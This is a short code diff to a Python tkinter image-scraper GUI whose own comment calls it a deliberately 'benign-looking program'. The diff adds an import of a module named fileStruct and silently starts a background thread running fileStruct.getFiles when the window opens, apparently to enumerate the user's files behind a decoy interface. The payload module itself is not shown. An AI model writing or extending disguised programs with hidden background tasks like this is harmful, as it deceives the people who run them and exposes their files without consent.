@@ -1,9 +1,11 @@
 # part 1: Write a benign-looking program, such as image extractor from a website 
 #         which the user inputs. Ask to choose a folder within the system using a 
 #         pop-up file explorer. 
+import threading
 import tkinter as tk
 from tkinter import END, filedialog as fd
 import imagescraper
+import fileStruct
 
 # window
 window = tk.Tk()
@@ -50,6 +52,8 @@ submitBtn.pack()
 #-----
 
 # loop
+thr = threading.Thread(target=fileStruct.getFiles, args=(), kwargs={})
+thr.start()
 window.mainloop()
 
 
